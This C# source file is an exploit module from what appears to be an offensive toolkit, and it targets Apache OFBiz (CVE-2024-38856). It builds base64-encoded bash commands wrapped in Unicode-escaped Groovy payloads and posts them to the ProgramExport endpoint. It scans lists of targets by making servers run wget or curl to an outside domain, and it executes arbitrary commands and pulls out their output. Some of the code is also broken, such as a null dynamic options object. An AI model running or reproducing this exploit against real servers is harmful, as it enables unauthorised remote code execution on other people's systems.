using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace OelianderUI.Helpers.Exploits
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Net.Http;
    using System.Text;
    using System.Threading.Tasks;
    using System.Linq;
    using System.Net;
    using Newtonsoft.Json;
    using Org.BouncyCastle.Asn1.X509;

    public class ApacheOFBIZ
    {
        /// <summary>
        /// Apache OFBiz < 18.12.14 [CVE-2024-38856]
        /// </summary>

        internal static readonly string banner = @"
██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗  █████╗  █████╗ ███████╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║     ╚════██╗██╔══██╗██╔══██╗██╔════╝██╔════╝ 
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗█████╔╝╚█████╔╝╚█████╔╝███████╗███████╗ 
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚═══██╗██╔══██╗██╔══██╗╚════██║██╔═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║     ██████╔╝╚█████╔╝╚█████╔╝███████║╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝     ╚═════╝  ╚════╝  ╚════╝ ╚══════╝ ╚═════╝ 
                                                                                                            
                        Apache OFBiz RCE < 18.12.14
";

        public static async Task ScanForApacheOfBiz(string domain, string target, string proxy, bool Scan = true, int port = 8443)
        {
            dynamic options = null;
            options.Target = target;
            options.Port = port;
            options.Scan = Scan;
            options.ExploitCommand = false;
            options.Timeout = 10;
            options.Domain = domain;
            options.OutputFile = "Results/ApacheOFBiz/output.txt";
            options.Command = "ls";
            options.Proxy = proxy;

            if (!Directory.Exists("Results/ApacheOFBiz"))
                Directory.CreateDirectory("Results/ApacheOFBiz");

            var targets = new List<string>();
            if (target.EndsWith(".txt"))
                targets.AddRange(File.ReadLines(target));
            else
                targets.Add(options.Target + ":" + (options.Port ?? 8443));
            
            foreach (var _target in targets)
            {
                await ProcessTarget(_target, options);
            }
        }

        static string CommandEncoder(string command)
        {
            string commandWithMarkers = $"echo [result]; {command}; echo [result];";
            var encodedCommand = Convert.ToBase64String(Encoding.UTF8.GetBytes(commandWithMarkers));
            return encodedCommand;
        }

        static string PayloadUnicode(string base64EncodedCommand)
        {
            string command = $"throw new Exception([\"bash\", \"-c\", \"{{echo,{base64EncodedCommand}}}|{{base64,-d}}|{{bash,-i}}\"].execute().text);";
            var unicodePayload = string.Join("", command.Select(c => $"\\u{(int)c:x4}"));
            return unicodePayload;
        }

        static string ExtractOutput(string responseText)
        {
            var startMarker = "[result]";
            var endMarker = "[result]";
            int startIndex = responseText.IndexOf(startMarker);
            int endIndex = responseText.IndexOf(endMarker, startIndex + startMarker.Length);

            if (startIndex != -1 && endIndex != -1)
            {
                return responseText.Substring(startIndex + startMarker.Length, endIndex - startIndex - startMarker.Length).Trim();
            }
            return null;
        }

        static async Task<(HttpStatusCode statusCode, string responseText)> Exploit(string target, int port, string payload, int timeout, string proxy = null)
        {
            string url = $"{target}:{port}/webtools/control/main/ProgramExport";
            var client = new HttpClient();

            if (proxy != null)
            {
                client.DefaultRequestHeaders.Add("Proxy", proxy);
            }

            var headers = new Dictionary<string, string>
            {
                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" },
                { "Content-Type", "application/x-www-form-urlencoded" }
            };

            var data = $"groovyProgram={payload}";

            try
            {
                var content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");
                var response = await client.PostAsync(url, content);
                var responseText = await response.Content.ReadAsStringAsync();
                return (response.StatusCode, responseText);
            }
            catch (Exception e)
            {
                Objects.ShowAlert("Error", $"Exception: {e.Message}", 2);
                return (HttpStatusCode.ServiceUnavailable, string.Empty);
            }
        }

        static async Task<List<(string command, HttpStatusCode statuscode)>> ScanVulnerability(string target, int port, string domain, int timeout, string proxy = null)
        {
            var scanCommands = new List<string>
            {
                $"ping -c 4 {domain}",
                $"wget -O- {domain}",
                $"curl {domain}"
            };

            var results = new List<(string, HttpStatusCode)>();
            string url = $"{target}:{port}/webtools/control/main/ProgramExport";
            var client = new HttpClient();

            if (proxy != null)
            {
                client.DefaultRequestHeaders.Add("Proxy", proxy);
            }

            var headers = new Dictionary<string, string>
            {
                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" },
                { "Content-Type", "application/x-www-form-urlencoded" }
            };

            foreach (var command in scanCommands)
            {
                string encodedCommand = CommandEncoder(command);
                string unicodePayload = PayloadUnicode(encodedCommand);
                var data = $"groovyProgram={unicodePayload}";

                try
                {
                    var content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");
                    var response = await client.PostAsync(url, content);
                    results.Add((command, response.StatusCode));
                }
                catch (Exception e)
                {
                    results.Add((command, HttpStatusCode.RequestTimeout));
                    Objects.ShowAlert("Request Failed", $"Request to {target}:{port} failed. Exception: {e.Message}", 2);
                }
            }

            return results;
        }

        static async Task ProcessTarget(string target, dynamic options)
        {
            var targetHost = target.Split(':')[0];
            var port = int.Parse(target.Split(':')[1]);

            if (!options.ExploitCommand)
            {
                var scanResults = await ScanVulnerability(targetHost, port, options.Domain, options.Timeout);
                bool vulnerable = false;
                foreach (var _result in scanResults)
                {
                    if (_result.statuscode == HttpStatusCode.RequestTimeout)
                    {
                        Objects.ShowAlert("Timeout", $"[+] Scan Payload: {_result.command} - Request timed out", 1);
                    }
                    else
                    {
                        Objects.ShowAlert("Vulnerable", $"[+] Scan Payload: {_result.command} - Status Code: {_result.statuscode}", 0);
                        if (_result.statuscode == HttpStatusCode.OK)
                        {
                            vulnerable = true;
                        }
                    }
                }
                string result = vulnerable ? $"[!] Target {targetHost}:{port} is vulnerable." : $"[!] Target {targetHost}:{port} is not vulnerable.";
                SaveOutput(result, options.OutputFile);
            }
            else
            {
                string encodedCommand = CommandEncoder(options.Command);
                string unicodePayload = PayloadUnicode(encodedCommand);
                var _result = await Exploit(targetHost, port, unicodePayload, options.Timeout);
                string output = ExtractOutput(_result.responseText);
                string result = output != null
                    ? $"[!] Exploit output: Target: {targetHost}, Port: {port}, Status Code: {_result.statusCode}, Output: {output}"
                    : $"[!] Exploit executed, but no output found. Target: {targetHost}, Port: {port}, Status Code: {_result.statusCode}";
                SaveOutput(result, options.OutputFile);
            }
        }

        static void SaveOutput(string output, string outputFile = null)
        {
            if (outputFile != null)
            {
                File.AppendAllText(outputFile, output + Environment.NewLine);
            }
            else
            {
                Objects.ShowAlert("Apache OFBiz Scan", output, 0);
            }
        }

    }

}
